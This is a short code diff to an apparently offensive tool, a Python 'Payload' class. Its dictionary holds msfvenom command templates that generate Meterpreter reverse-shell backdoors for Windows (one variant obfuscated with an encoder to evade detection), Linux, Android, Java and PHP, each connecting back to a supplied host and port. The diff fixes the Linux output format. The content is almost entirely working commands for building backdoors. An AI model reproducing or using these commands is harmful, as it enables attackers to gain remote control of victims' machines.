@@ -14,7 +14,7 @@ class Payload(object):
     payloads = {
         "windows" : "msfvenom -p windows/meterpreter/reverse_tcp lhost={}  lport={}  -f exe > backdoor.exe",
         "windwos_ofuscate": "msfvenom -p windows/meterpreter/reverse_tcp lhost={}  lport={}  -f raw -e x86/shikata_ga_nai -i 5 -o backdoorOfuscate.exe",
-        "linux":"msfvenom -p linux/x86/meterpreter_reverse_tcp lhost={} lport={} > backdoor.bin",
+        "linux":"msfvenom -p linux/x86/meterpreter_reverse_tcp lhost={} lport={}  -f elf > backdoor.bin",
         "android":"msfvenom -p  android/meterpreter/reverse_tcp lhost={} lport={} > backdoor.apk",
         "mac_os":"msfvenom -p  java/meterpreter/reverse_tcp lhost={} lport={} -f jar > backdoor.jar",
         "web":"msfvenom -p  php/meterpreter/reverse_tcp lhost={} lport={} > backdoor.php"
